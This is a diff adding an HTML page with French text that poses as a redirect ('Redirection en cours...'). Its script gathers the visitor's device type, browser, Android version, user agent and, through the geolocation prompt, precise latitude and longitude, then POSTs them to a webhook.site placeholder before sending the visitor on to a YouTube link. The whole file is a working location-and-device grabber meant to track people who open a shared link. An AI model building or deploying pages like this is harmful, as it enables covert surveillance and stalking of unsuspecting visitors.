@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirection...</title>
+</head>
+<body>
+    <p>Redirection en cours...</p>
+
+    <script>
+        const userAgent = navigator.userAgent;
+        let deviceType = /Mobile|Android/i.test(userAgent) ? "Téléphone" : "Ordinateur";
+
+        let browser = "Navigateur inconnu";
+        if (userAgent.includes("Chrome")) browser = "Chrome";
+        else if (userAgent.includes("Firefox")) browser = "Firefox";
+        else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
+        else if (userAgent.includes("Edge")) browser = "Edge";
+
+        let androidVersion = userAgent.match(/Android\\s+([\\d.]+)/);
+        let version = androidVersion ? androidVersion[1] : "Non Android ou non détecté";
+
+        const infos = {
+            appareil: deviceType,
+            navigateur: browser,
+            versionAndroid: version,
+            userAgent: userAgent
+        };
+
+        // Fonction d'envoi des données
+        function envoyerInfos(position) {
+            if (position) {
+                infos.latitude = position.coords.latitude;
+                infos.longitude = position.coords.longitude;
+            } else {
+                infos.latitude = "Refusé";
+                infos.longitude = "Refusé";
+            }
+
+            // Envoi via webhook (par ex. à un Google Sheet, Zapier, ou autre)
+            fetch("https://webhook.site/TON-URL-ICI", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(infos)
+            });
+
+            // Redirection après 2 secondes
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // lien YouTube ou autre
+            }, 2000);
+        }
+
+        // Géolocalisation si autorisée
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => envoyerInfos(pos),
+                () => envoyerInfos(null)
+            );
+        } else {
+            envoyerInfos(null);
+        }
+    </script>
+</body>
+</html>
